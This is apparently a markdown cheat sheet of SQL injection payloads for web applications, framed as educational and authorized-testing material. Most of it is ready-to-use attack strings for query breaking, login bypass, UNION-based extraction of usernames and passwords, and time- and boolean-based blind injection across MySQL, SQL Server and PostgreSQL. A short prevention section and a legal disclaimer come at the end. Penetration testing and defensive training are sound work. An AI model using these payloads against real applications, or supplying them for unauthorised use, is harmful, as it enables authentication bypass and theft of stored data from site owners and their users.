# 🔐 SQL Injection Testing Reference Guide

> **Educational Purpose Only**: This guide is for authorized security testing and educational purposes in controlled environments.

---

## 📚 Table of Contents

1. [Introduction](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#introduction)
2. [Basic Injection Techniques](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#basic-injection-techniques)
3. [Authentication Bypass](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#authentication-bypass)
4. [Union-Based Injection](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#union-based-injection)
5. [Time-Based Blind Injection](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#time-based-blind-injection)
6. [Boolean-Based Blind Injection](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#boolean-based-blind-injection)
7. [Order By Enumeration](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#order-by-enumeration)
8. [Prevention Techniques](https://claude.ai/chat/cf2b7447-daea-4da7-8204-d2909a331c19#prevention-techniques)

---

<h1 align='center'> Query Break</h1>

```sql

'
%27
"
%22
#
%23
;
%3B
)
`
')
")
`)
'))
"))
`))
Wildcard (*)
&apos;  # required for XML content
'/*
'/\*
';--
*/
```

- **`Multiple encoding`**
```sql
%%2727
%25%27
```

<h1 align='center'>Query Join</h1>

- MySQL
```sql
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */
```

- PostgreSQL
```sql
--comment
/*comment*/
```

- more ways to break
```sql
' -- -
'--'
"--"
') or true--
" or "1"="1
" or "1"="1"#
" or "1"="1"/*
"or 1=1 or ""="
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"#
") or ("1"="1"/*
") or "1"="1
") or "1"="1"--
") or "1"="1"#
") or "1"="1"/*
```


## Introduction

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers insert malicious SQL statements into entry fields for execution.

### Common Vulnerable Parameters

- Login forms
- Search fields
- URL parameters
- Cookie values
- HTTP headers

---

## Basic Injection Techniques

### Simple Boolean Tests

```sql
' OR '1'='1
' OR 1=1--
" OR ""="
" OR 1=1--
') OR ('x')=('x
```

### Comment Indicators

```sql
--          (SQL comment)
#           (MySQL comment)
/*...*/     (Multi-line comment)
```

### Null Byte Injection

```sql
%00
```

---

## Authentication Bypass

### Classic Bypass Patterns

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR '1'='1
' OR ''='
'='
'LIKE'
'=0--+
```

### Advanced Bypass

```sql
' OR 'x'='x
' AND id IS NULL; --
admin') OR ('1'='1
```

---

## Union-Based Injection

Union attacks combine results from multiple SELECT statements.

### Column Enumeration

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

### Data Extraction

```sql
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name FROM information_schema.tables--
```

### Group By Techniques

```sql
' GROUP BY columnnames HAVING 1=1--
1' GROUP BY 1,2--+
1' GROUP BY 1,2,3--+
```

---

## Time-Based Blind Injection

When no visual feedback is available, time delays confirm vulnerabilities.

### MySQL Sleep

```sql
SLEEP(5)
' OR SLEEP(5)--
1' AND SLEEP(5)--
BENCHMARK(10000000,MD5(1))
```

### SQL Server Delays

```sql
WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--
1); WAITFOR DELAY '0:0:5'--
```

### PostgreSQL Delays

```sql
pg_sleep(5)
1' OR pg_sleep(5)--
SELECT pg_sleep(5)
```

### Advanced Time-Based

```sql
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
```

---

## Boolean-Based Blind Injection

### Version Detection

```sql
' AND MID(VERSION(),1,1) = '5
' AND (SELECT SUBSTRING(@@version,1,1))='M
' AND (SELECT SUBSTRING(@@version,2,1))='y
```

### Conditional Tests

```sql
AND 1=1
AND 1=0
AND true
AND false
OR 1=1
OR 1=0
```

### String Comparisons

```sql
AND 'pytW' LIKE 'pytW
AND 'pytW' LIKE 'pytY
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))
```

---

## Order By Enumeration

Determine the number of columns in a result set.

### Systematic Enumeration

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
...
ORDER BY 10--
```

### Alternative Syntax

```sql
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
```

---

## Prevention Techniques

### 1. Parameterized Queries (Prepared Statements)

**Good Practice:**

```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

**Bad Practice:**

```python
cursor.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
```

### 2. Input Validation

- Whitelist allowed characters
- Validate data types
- Limit input length
- Sanitize special characters

### 3. Stored Procedures

Use parameterized stored procedures to abstract database logic.

### 4. Least Privilege Principle

- Database accounts should have minimum necessary permissions
- Never use admin/root accounts for application connections
- Separate read and write permissions

### 5. Web Application Firewalls (WAF)

Implement WAFs to detect and block SQL injection attempts.

### 6. Error Handling

- Never display detailed database errors to users
- Log errors securely for administrators
- Use generic error messages

### 7. Additional Security Measures

- Regular security audits
- Keep database software updated
- Use ORM frameworks properly
- Implement rate limiting
- Monitor and log database queries

---

## 🎯 Testing Methodology

### Step 1: Identify Input Points

Map all user-controllable inputs in the application.

### Step 2: Test for Vulnerabilities

Submit test payloads and observe responses.

### Step 3: Confirm Exploitability

Verify that injection is possible and determine the database type.

### Step 4: Extract Information

Use appropriate techniques based on feedback type (error, boolean, time).

### Step 5: Document Findings

Record all vulnerabilities with proof-of-concept examples.

---

## ⚠️ Legal and Ethical Considerations

**IMPORTANT:**

- Only test systems you have explicit permission to test
- Never access, modify, or delete data without authorization
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations
- Use this knowledge to defend systems, not attack them

---

## 📖 Further Learning Resources

- OWASP SQL Injection Guide
- PortSwigger SQL Injection Labs
- SQLMap Documentation
- Web Application Hacker's Handbook
- DVWA (Damn Vulnerable Web Application)

---

**Remember:** With great knowledge comes great responsibility. Use these techniques only for authorized security testing and education.




